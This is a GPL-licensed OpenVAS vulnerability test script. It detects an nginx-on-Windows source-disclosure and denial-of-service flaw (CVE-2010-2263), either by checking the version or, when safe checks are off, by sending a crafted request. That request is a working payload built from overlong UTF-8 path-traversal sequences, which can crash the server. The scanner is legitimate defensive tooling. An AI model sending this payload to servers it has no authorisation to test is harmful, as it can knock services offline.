###############################################################################
# OpenVAS Vulnerability Test
#
# nginx Remote Source Code Disclosure and Denial of Service Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:nginx:nginx";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100676");
  script_version("2022-05-02T09:35:37+0000");
  script_tag(name:"last_modification", value:"2022-05-02 09:35:37 +0000 (Mon, 02 May 2022)");
  script_tag(name:"creation_date", value:"2010-06-14 14:19:59 +0200 (Mon, 14 Jun 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-2263");

  script_name("nginx Remote Source Code Disclosure and Denial of Service Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40760");

  script_tag(name:"qod_type", value:"remote_probe");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("os_detection.nasl", "gb_nginx_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("nginx/detected", "Host/runs_windows");

  script_tag(name:"summary", value:"nginx is prone to remote source-code-disclosure and denial of service
  vulnerabilities.");

  script_tag(name:"impact", value:"An attacker can exploit these vulnerabilities to view the source code
  of files in the context of the server process or cause denial-of-service conditions.");

  script_tag(name:"affected", value:"nginx 0.8.36 for Windows is vulnerable, other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("version_func.inc");

if( isnull( port = get_app_port( cpe: CPE ) ) )
  exit( 0 );

if( safe_checks() ) {
  if( ! infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: TRUE ) )
    exit( 0 );

  version = infos["version"];
  location = infos["location"];

  if( version_is_equal( version: version, test_version: "0.8.36" ) ) {
    report = report_fixed_ver( installed_version: version, fixed_version: "None", install_path: location );
    security_message( port: port, data: report );
    exit( 0 );
  }
} else {
  if( ! port )
    exit( 0 );

  if( http_is_dead( port: port ) )
    exit( 0 );

  req = string( "GET /%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%20 HTTP/1.1\r\nHost: ", get_host_name(), "\r\n\r\n" );

  soc = http_open_socket( port );
  if( ! soc )
    exit( 0 );

  send( socket: soc, data: req );

  if( http_is_dead( port: port ) ) {
    security_message( port: port );
    exit( 0 );
  }

  http_close_socket( soc );
}

exit( 99 );
